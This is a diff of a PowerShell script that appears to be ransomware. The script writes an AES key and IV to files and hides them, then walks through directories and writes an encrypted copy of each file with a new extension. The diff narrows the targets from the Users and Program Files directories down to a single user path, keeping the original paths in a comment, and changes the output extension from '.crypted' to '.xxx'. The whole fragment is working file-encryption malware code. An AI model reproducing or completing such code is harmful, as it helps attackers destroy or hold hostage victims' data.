@@ -12,7 +12,7 @@ $AES.IV | Set-Content $UserPath\IV.s
 (get-item $UserPath\key.s).Attributes += 'Hidden'
 (get-item $UserPath\IV.s).Attributes += 'Hidden'
 
-$locations = 'C:\Users\','C:\Program Files\','C:\Program Files (x86)'
+$locations = $UserPath #'C:\Users\','C:\Program Files\','C:\Program Files (x86)'
 
 
 foreach ($location in $locations)
@@ -27,7 +27,7 @@ foreach ($item in $items)
 {
 $File = Get-Item -Path $item
 $InputStream = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
-$OutputStream = New-Object System.IO.FileStream((($File.FullName) + ".crypted"), [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
+$OutputStream = New-Object System.IO.FileStream((($File.FullName) + ".xxx"), [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
 $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($OutputStream, $Encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
 $InputStream.CopyTo($CryptoStream)
 $CryptoStream.Dispose()
